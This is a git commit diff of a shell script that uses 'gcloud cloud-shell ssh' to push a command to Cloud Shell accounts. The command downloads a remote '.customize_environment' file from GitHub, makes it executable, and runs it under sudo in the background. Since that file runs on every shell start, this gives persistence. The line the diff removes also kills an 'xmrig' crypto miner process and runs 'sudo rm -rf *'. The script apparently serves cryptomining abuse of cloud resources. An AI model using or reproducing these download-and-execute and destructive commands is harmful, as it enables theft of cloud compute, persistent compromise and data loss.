c9f6e2e9c897d561ac173e065ef119c72d69bfe1
Predador21 <81100606+Predador21@users.noreply.github.com>
2021-09-08 16:01:58 -0300

    Update command.sh

--- command.sh
+++ command.sh
@@ -3,7 +3,6 @@
 echo
 echo $1
 
-#command="sudo pkill xmrig ; sudo pkill ping.sh ; sudo rm -rf * ; sudo rm -rf .customize_environment ; ls -a ;  wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null & "
 command="[ ! -e '.customize_environment' ] && ( wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null & )"
 
 gcloud cloud-shell ssh --account=$1 --command="$command" --authorize-session --force-key-file-overwrite --ssh-flag='-n' --quiet
